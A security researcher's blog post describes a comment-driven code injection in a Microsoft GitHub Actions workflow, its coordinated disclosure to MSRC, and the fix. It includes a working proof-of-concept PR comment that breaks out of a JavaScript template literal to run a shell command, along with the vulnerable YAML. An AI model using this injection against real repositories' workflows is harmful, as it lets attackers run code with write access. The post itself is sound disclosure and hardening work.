# The danger of comments in pull requests

## Background

Recently, I learned more about securing GitHub Actions in open source projects and found practical ways to harden workflows and reduce the risk of supply-chain attacks. After applying these practices to ImageMagick and my own repositories, I wondered how other organizations secured their GitHub Actions. I decided to check some organizations on GitHub to see how they secured their workflows. During this research I found a project that had a dangerous configuration in one of their workflows. The workflow parsed PR comments and executed code based on them—meaning anyone able to comment on a PR could run code in the repository context. This was a serious security issue that I reported to the Microsoft Security Response Center (MSRC). In this story I will explain what I found and how I reported this issue.

## Exploiting comments in pull requests to execute code

While reviewing the workflow at [https://github.com/microsoft/aqa-tests/blob/e0118ab8ecc524b2718998ed4e212dc7a489c67a/.github/workflows/runAqa.yml](https://github.com/microsoft/aqa-tests/blob/e0118ab8ecc524b2718998ed4e212dc7a489c67a/.github/workflows/runAqa.yml) (effectively inherited from the adoptium fork), I noticed the following job triggered by PR comments:

{% raw %}
```yaml
jobs:
  parseComment:
    runs-on: ubuntu-latest
    if: startsWith(github.event.comment.body, 'run aqa') && github.event.issue.pull_request
```
{% endraw %}

That job ran the following step:

{% raw %}
```yaml
- name: Parse parameters
  env:
    args: ${{ github.event.comment.body }}
  run: python3 TKG/scripts/testBot/runAqaArgParse.py $args 2> log.txt
```
{% endraw %}

The raw comment body is passed as CLI arguments to a Python script. To test exploitability, I used a private fork and opened a PR there. Direct code injection into the Python step didn’t work, but the script’s output was later used in the workflow:

{% raw %}
```yaml
- name: Output log
  if: failure()
  # Store the contents of log.txt into an environment variable and escape characters to preserve newlines and other symbols.
  run: |
    log=$(cat log.txt)
    log="${log//'%'/'%25'}"
    log="${log//$'\n'/'%0A'}"
    log="${log//$'\r'/'%0D'}"
    log="${log/$'`'/'\`'}"
    echo ::set-output name=log::$log
  id: output_log
- name: Create error comment
  if: failure()
  uses: actions/github-script@v7
  with:
    github-token: ${{secrets.GITHUB_TOKEN}}
    script: |
      comment_body = `
      @${{ github.actor }}
      \`\`\`
      ${{ steps.output_log.outputs.log }}
      \`\`\`
      No builds were started.
      `;
      github.rest.issues.createComment({
        issue_number: context.issue.number,
        owner: context.repo.owner,
        repo: context.repo.repo,
        body: comment_body
      })
```
{% endraw %}

Here the error output is injected directly into a JavaScript template literal without proper escaping at source generation time. That allows breaking out of the literal and injecting JavaScript into the `actions/github-script` step. I added this comment to the PR:

```
run aqa ``;await exec.exec('ls -all');comment_body=`
```

That resulted in the following script being executed:

```typescript
comment_body = `
@dlemstra
\`\`\`
usage: run aqa [--help]
...
run aqa: error: unrecognized arguments: \``;await exec.exec('ls -all');comment_body=`
\`\`\`
No builds were started.
`;
```

And the workflow logs confirmed command execution:

```
[command]/usr/bin/ls -all
total 20
drwxr-xr-x 4 runner runner 4096 Oct 24 07:16 .
drwxr-xr-x 3 runner runner 4096 Oct 24 07:16 ..
drwxr-xr-x 8 runner runner 4096 Oct 24 07:16 TKG
-rw-r--r-- 1 runner runner  978 Oct 24 07:16 log.txt
drwxr-xr-x 4 runner runner 4096 Oct 24 07:16 main
```

This confirmed arbitrary command execution within the workflow context. The workflow also had the following permissions:

```yaml
permissions:
  contents: write
  issues: write
```

With write permissions to contents and issues, repository compromise was feasible. With proof of execution in hand, I reported it.

## Reporting the issue

After confirming code execution, I checked the repository’s security tab for its disclosure policy and followed it to report the vulnerability to MSRC. I sent a detailed write‑up with the PoC on October 24, 2025; MSRC opened a case the next day. On November 4, 2025, they validated the issue, coordinated with the maintainers, and the workflow was promptly disabled to prevent exploitation. I later learned it had also been remediated in the original Adoptium repository, but I did not know that at the time and was curious how I could have fixed it myself. So I asked GitHub Copilot for a remediation suggestion.

## Using GitHub Copilot to fix the vulnerability

I opened the workflow file in GitHub and pressed the Copilot button at the top of the file. This opened a new page where I could ask Copilot to help me fix the issue. I selected the line with {% raw %}`${{ steps.output_log.outputs.log }}`{% endraw %} and asked Copilot, "How can I fix the command injection on this line?" This was Copilot’s suggestion:

{% raw %}
```yaml
- name: Create error comment
  if: failure()
  uses: actions/github-script@v7
  env:
    LOG_OUTPUT: ${{ steps.output_log.outputs.log }}
  with:
    github-token: ${{secrets.GITHUB_TOKEN}}
    script: |
      const log = process.env.LOG_OUTPUT;
      const comment_body = `
      @${{ github.actor }}
      \`\`\`
      ${log}
      \`\`\`
      No builds were started.
      `;
      github.rest.issues.createComment({
        issue_number: context.issue.number,
        owner: context.repo.owner,
        repo: context.repo.repo,
        body: comment_body
      })
```
{% endraw %}

This uses an environment variable to pass the log text into the script. Crucially, the untrusted content is no longer spliced into the JavaScript source before it’s parsed; it’s read at runtime via `process.env`. That prevents breaking out of the template literal and blocks code injection. It’s a good, minimal fix.

### Additional hardening tips

While researching how I could improve the security of workflows that process untrusted text, I found a tool called [zizmor](https://github.com/zizmorcore/zizmor) that can help identify similar issues in GitHub Actions workflows. Here are some of the outputs from this tool that are relevant to this workflow:

```
error[excessive-permissions]: overly broad permissions
 --> runAqa.yml:6:7
  |
6 |       contents: write
  |       ^^^^^^^^^^^^^^^ contents: write is overly broad at the workflow level
  |
  = note: audit confidence → High
```

This indicates that the workflow has overly broad permissions. To mitigate this, it’s recommended to follow the principle of least privilege by restricting permissions to only what is necessary for the workflow to function. This was also found in the original workflow:

```
error[unpinned-uses]: unpinned action reference
   --> runAqa.yml:119:7
    |
119 |     - uses: AdoptOpenJDK/install-jdk@v1
    |       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ action is not pinned to a hash (required by blanket policy)
    |
    = note: audit confidence → High
```

This indicates that the workflow uses an unpinned action reference. To mitigate this, it’s recommended to pin actions to a specific commit SHA to ensure that the exact version of the action is used, preventing potential supply-chain attacks. And it of course also mentions the issue that I found:

```
info[template-injection]: code injection via template expansion
  --> runAqa.yml:60:15
   |
53 |       uses: actions/github-script@v7
   |       ------------------------------ action accepts arbitrary code
...
56 |         script: |
   |         ------ via this input
...
60 |           ${{ steps.output_log.outputs.log }}
   |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^ may expand into attacker-controllable code
   |
   = note: audit confidence → Low
```


If you maintain workflows that react to comments or issue bodies, review them for similar string‑injection risks—especially around template literals and shell/JS concatenation.

</[@dlemstra](https://github.com/dlemstra)>